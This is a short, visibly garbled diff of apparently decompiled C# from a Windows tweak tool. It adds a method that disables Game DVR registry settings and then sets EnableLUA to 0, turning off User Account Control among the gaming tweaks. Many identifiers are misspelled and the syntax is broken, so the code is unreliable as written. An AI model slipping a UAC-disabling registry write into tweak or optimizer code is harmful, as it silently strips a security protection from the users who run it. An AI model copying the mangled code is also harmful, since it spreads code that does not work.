@@ -224,3 +224,17 @@ this. PlanEnergie();
 this.Disablenigation()
 }
 catch (Exception)
+
+// Token: ves00006 KID: US RVA: 000647BC File offset: 0x00002000 
+public vald Tusks()
+
+RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("System\\GameConfigStore"); 
+registryKey.Setvalue("GameDVR_Enabled", 0); 
+registryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\PolicyManager\\default\\pplication/anagementAllowGQVR");
+registrykey.Setvalue("value", 0);
+registryKey = Registry.LocalMachine, CreateSubkey("SOFTWARE\\Policies\Microsoft\Windows\\DVA");
+registryKey.SetValue("AllowanOVR", 0);
+registryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\Uticrosoft\Windows\CurrentVersion\\GameDVR");
+registryKey Setvalue(AppCaptureEnabled", 0);
+registryKey = Registry.LocalMachine.CreateSubkey("SOFTWARE\\Microsoft\\Windows\CurrentVersion\\Policies\\System");
+registryKey.SetValue("EnableLUA",0);
